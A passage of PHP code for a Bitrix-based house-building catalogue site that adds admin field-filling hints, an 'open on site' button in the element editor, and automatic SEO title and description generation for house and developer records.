            "<b>Название</b> и <b>превью-изображение</b> — главная карточка в каталоге",
            "<b>Площадь</b> и <b>Цена</b> — нужны для калькулятора и сортировки",
            "<b>Материал</b> — отображается на карточке и в фильтре",
            "<b>Галерея вверху</b> — слайды на детальной странице дома (хотя бы 3 фото)",
            "<b>Планировка 1 этаж</b> + <b>описание</b>; для двухэтажных — те же поля для 2 этажа",
            "<b>PDF планировки</b> — если загружен, кнопка «Скачать PDF» сразу скачивает файл; если нет — открывается форма запроса",
            "<b>Статус</b>: один из чекбоксов — «Готовый дом» или «Идёт строительство». По умолчанию — Проект",
        ];
        $hint = "Хотите быстрее? Скопируйте существующий дом (правый клик по строке → «Копировать») и поменяйте поля.";
    } else {
        $title = "Застройщик — что заполнить";
        $items = [
            "<b>Название</b> компании и <b>превью-изображение</b> — карточка в списке",
            "<b>Логотип</b> — отдельным файлом, для шапки на детальной",
            "<b>Опыт (лет)</b> и <b>Количество построенных домов</b> — выводятся как мини-статистика",
            "<b>Регион</b> — пишите коротко (например, «Краснодарский край»)",
            "<b>Контакты</b>: телефон, email, сайт — все три желательно заполнить",
            "<b>Галерея</b> — фото объектов застройщика (хотя бы 4–6 штук)",
        ];
        $hint = "";
    }
    $li = '';
    foreach ($items as $it) $li .= '<li style="margin:3px 0">' . $it . '</li>';
    $hintHtml = $hint ? ('<div style="margin-top:8px;color:#5b6473;font-size:12px">💡 ' . htmlspecialchars($hint, ENT_QUOTES, 'UTF-8') . '</div>') : '';
    $html = '<div class="zemex-admin-tip" style="margin:12px 18px;padding:12px 16px;background:#eaf6ea;border-left:3px solid #27ae60;font-size:13px;border-radius:3px"><div style="font-weight:700;margin-bottom:6px">📋 ' . $title . '</div><ul style="margin:0;padding-left:22px">' . $li . '</ul>' . $hintHtml . '</div>';
    echo '<script>document.addEventListener("DOMContentLoaded",function(){var h=document.querySelector(".adm-workarea, #workarea-content, #content");if(!h)return;var d=document.createElement("div");d.innerHTML=' . json_encode($html, JSON_UNESCAPED_UNICODE) . ';h.insertBefore(d.firstChild, h.firstChild);});</script>';
});

// HOMES_ADMIN_OPEN_ON_SITE: кнопка «Открыть на сайте» в форме редактирования элементов 43/68
AddEventHandler("main", "OnEpilog", function () {
    if (!defined("ADMIN_SECTION") || !ADMIN_SECTION) return;
    $uri = $_SERVER["REQUEST_URI"] ?? "";
    if (strpos($uri, "iblock_element_edit.php") === false) return;
    $iblock = (int)($_GET["IBLOCK_ID"] ?? 0);
    $elementId = (int)($_GET["ID"] ?? 0);
    if (!$elementId || !in_array($iblock, [43, 68], true)) return;
    if (!CModule::IncludeModule("iblock")) return;

    $rs = CIBlockElement::GetList([], ['IBLOCK_ID' => $iblock, 'ID' => $elementId], false, false, ['ID', 'DETAIL_PAGE_URL', 'NAME']);
    $row = $rs->GetNext();
    if (!$row || empty($row['DETAIL_PAGE_URL'])) return;
    $url = $row['DETAIL_PAGE_URL'];

    $btnHtml = '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '" target="_blank" rel="noopener" '
        . 'style="display:inline-flex;align-items:center;gap:6px;padding:5px 12px;margin-left:10px;'
        . 'background:#fff;border:1px solid #00bf3f;border-radius:4px;color:#0a3d1a;'
        . 'font-size:12px;font-weight:600;text-decoration:none;vertical-align:middle">'
        . '🔗 Открыть на сайте</a>';

    echo '<script>document.addEventListener("DOMContentLoaded",function(){'
        . 'var bar=document.querySelector(".adm-detail-toolbar-right, .adm-detail-toolbar, #buttons");'
        . 'if(!bar){var s=document.querySelector(".adm-btn-save, input[name=save]"); if(s) bar=s.parentNode;}'
        . 'if(!bar) return;'
        . 'var w=document.createElement("span");w.innerHTML=' . json_encode($btnHtml, JSON_UNESCAPED_UNICODE) . ';'
        . 'bar.appendChild(w.firstChild);'
        . '});</script>';
});

// HOMES_AUTO_SEO: автозаполнение SEO-полей при сохранении (только если на уровне элемента пусто)
AddEventHandler("iblock", "OnAfterIBlockElementAdd",    "ZemexHomesAutoSeo");
AddEventHandler("iblock", "OnAfterIBlockElementUpdate", "ZemexHomesAutoSeo");
function ZemexHomesAutoSeo(&$arFields) {
    $iblockId  = (int)($arFields['IBLOCK_ID'] ?? 0);
    $elementId = (int)($arFields['ID'] ?? 0);
    if (!$elementId || !in_array($iblockId, [43, 68], true)) return;
    if (!CModule::IncludeModule('iblock')) return;
    if (!class_exists('\\Bitrix\\Iblock\\InheritedProperty\\ElementTemplates')) return;

    // Что уже задано НА УРОВНЕ ЭЛЕМЕНТА (entity_type === 'E'): только это считаем «менеджер сам ввёл»
    $tpl = new \Bitrix\Iblock\InheritedProperty\ElementTemplates($iblockId, $elementId);
    $rows = $tpl->findTemplates();
    $isElementLevel = function($k) use ($rows) {
        return isset($rows[$k]['ENTITY_TYPE']) && $rows[$k]['ENTITY_TYPE'] === 'E' && !empty($rows[$k]['TEMPLATE']);
    };
    $needsTitle     = !$isElementLevel('ELEMENT_META_TITLE');
    $needsDesc      = !$isElementLevel('ELEMENT_META_DESCRIPTION');
    $needsPageTitle = !$isElementLevel('ELEMENT_PAGE_TITLE');
    if (!$needsTitle && !$needsDesc && !$needsPageTitle) return;

    $rs = CIBlockElement::GetByID($elementId);
    if (!($obj = $rs->GetNextElement())) return;
    $f = $obj->GetFields();
    $p = $obj->GetProperties();
    $name        = trim($f['NAME'] ?? '');
    $previewText = trim(strip_tags($f['PREVIEW_TEXT'] ?? ''));

    if ($iblockId === 43) {
        // Готовые дома
        $square   = trim($p['SQUARE']['VALUE'] ?? '');
        $price    = trim($p['PRICE']['VALUE'] ?? '');
        $material = is_array($p['MATERIAL']['VALUE'] ?? null) ? ($p['MATERIAL']['VALUE'][0] ?? '') : trim($p['MATERIAL']['VALUE'] ?? '');

        // Если в значении уже есть «кв.м» / «м²», не дублируем
        $squareLabel = '';
        if ($square) {
            $squareLabel = preg_match('/(кв\.?\s*м|м²)/iu', $square) ? $square : $square . ' м²';
        }
        $titleParts = [$name];
        if ($squareLabel) $titleParts[] = $squareLabel;
        if ($material)    $titleParts[] = $material;
        $autoTitle = implode(' · ', $titleParts) . ' — заказать у «Земельный экспресс»';

        $autoDesc = $previewText
            ?: (trim('Проект дома' . ($material ? ' из ' . mb_strtolower($material) : '') . ($squareLabel ? ', площадь ' . $squareLabel : '') . ($price ? ', цена от ' . $price . ' ₽' : '') . '. Фиксация цены и сроков в договоре, гарантия 5 лет.'));

        $autoPageTitle = $name;
    } else {
        // Застройщики
        $exp    = trim($p['EXPERIENCE']['VALUE'] ?? '');
        $count  = trim($p['HOUSES_COUNT']['VALUE'] ?? '');
        $region = trim($p['REGION']['VALUE'] ?? '');

        $titleParts = ['Застройщик ' . $name];
        if ($region) $titleParts[] = $region;
        if ($exp)    $titleParts[] = $exp . ' лет на рынке';
        $autoTitle = implode(' · ', $titleParts);

        $descParts = [];
        if ($count)  $descParts[] = 'построено ' . $count . ' домов';
        if ($exp)    $descParts[] = 'опыт ' . $exp . ' лет';
        if ($region) $descParts[] = 'регион ' . $region;
        $autoDesc = $previewText ?: (ucfirst($name . ' — ' . implode(', ', $descParts ?: ['проверенный партнёр']) . '.'));

        $autoPageTitle = $name;
    }

    $set = [];
    if ($needsTitle)     $set['ELEMENT_META_TITLE']       = $autoTitle;
    if ($needsDesc)      $set['ELEMENT_META_DESCRIPTION'] = $autoDesc;
    if ($needsPageTitle) $set['ELEMENT_PAGE_TITLE']      = $autoPageTitle;
    if (!$set) return;

    try {
        $tpl->set($set);
    } catch (\Throwable $e) { /* ignore */ }
}

?>
